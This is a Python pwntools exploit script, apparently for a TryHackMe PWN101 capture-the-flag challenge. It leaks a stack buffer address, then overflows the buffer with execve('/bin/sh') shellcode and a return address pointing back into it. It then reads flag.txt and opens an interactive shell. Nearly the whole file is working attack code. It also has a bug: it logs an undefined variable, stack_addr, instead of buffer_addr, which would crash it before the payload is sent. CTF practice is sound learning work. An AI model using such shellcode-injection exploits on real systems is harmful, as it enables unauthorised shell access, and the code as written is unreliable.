#!/bin/env python3

from pwn import *
import argparse

parser = argparse.ArgumentParser(description='TryHackMe PWN101 Challange 4 Exploit')

subparsers = parser.add_subparsers(dest='mode', help='Select mode: remote or local')

remote_parser = subparsers.add_parser('remote', help='Remote mode: Provide IP address and port')
remote_parser.add_argument('ip', help='IP address')
remote_parser.add_argument('port', help='Port number')

local_parser = subparsers.add_parser('local', help='Local mode: Provide file path')
local_parser.add_argument('file', help='File path')

args = parser.parse_args()

mode = args.mode

if mode == 'remote':
    ip = args.ip
    port = args.port
    p = remote(ip, port)
elif mode == 'local':
    file = args.file
    context.binary = binary = ELF(file)
    p = process()
else:
    parser.error('Please select remote or local mode.')
    
p.recvuntil(b"for you at ")
buffer_addr = p.recv().decode()
log.info("Address of buffer: " + stack_addr)

shell_code = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

payload = b''.join([
    shell_code,
    b'A'*(0x50 - len(shell_code)),
    b'B'*0x8,
    p64(int(buffer_addr, 16))
    ])

log.info("Sending Payload.")
p.sendline(payload)

log.info("Getting Flag")
p.sendline(b"cat flag.txt")
flag = p.recv().decode()

log.success("Flag achieved!: " + flag)

log.success("Getting Shell.")
p.interactive()
